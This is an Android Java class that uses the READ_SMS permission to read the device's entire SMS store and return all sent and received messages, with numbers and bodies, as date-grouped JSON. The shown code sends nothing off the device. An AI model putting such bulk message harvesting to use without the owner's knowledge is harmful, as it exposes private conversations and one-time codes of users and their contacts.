package DataCollection;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMS {

    public JSONObject getSMSLogsAsJSON(Context context) {
        JSONObject smsLogsByDate = new JSONObject();

        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            // URI to access SMS inbox content
            Uri uri = Uri.parse("content://sms/");

            // Querying both sent and received SMS
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);

            if (cursor != null) {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());

                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));  // Sender's phone number
                    @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));        // SMS body/content
                    @SuppressLint("Range") String type = cursor.getString(cursor.getColumnIndex("type"));        // 1 = received, 2 = sent
                    @SuppressLint("Range") long timestamp = cursor.getLong(cursor.getColumnIndex("date"));

                    // Convert timestamp to date
                    String date = dateFormat.format(new Date(timestamp));

                    // Determine if it's received or sent
                    String messageType = type.equals("1") ? "received" : "sent";
                    String contactName = messageType.equals("sent") ? "Me" : address;  // Replace with contact name lookup later
                    try {
                        // Create an entry for this SMS
                        JSONObject smsEntry = new JSONObject();
                        smsEntry.put("contact_name", contactName);
                        smsEntry.put("type", messageType);
                        smsEntry.put("body", body);

                        // Add to the respective date entry
                        if (!smsLogsByDate.has(date)) {
                            smsLogsByDate.put(date, new JSONArray());
                        }
                        smsLogsByDate.getJSONArray(date).put(smsEntry);
                    } catch (Exception e) {
                        Log.e("SMS", "Failed to process SMS", e);
                    }
                }
                cursor.close();
            }
        } else {
            Log.d("SMS", "Permission to read SMS not granted.");
        }

        return smsLogsByDate;  // Return the JSON object
    }
}
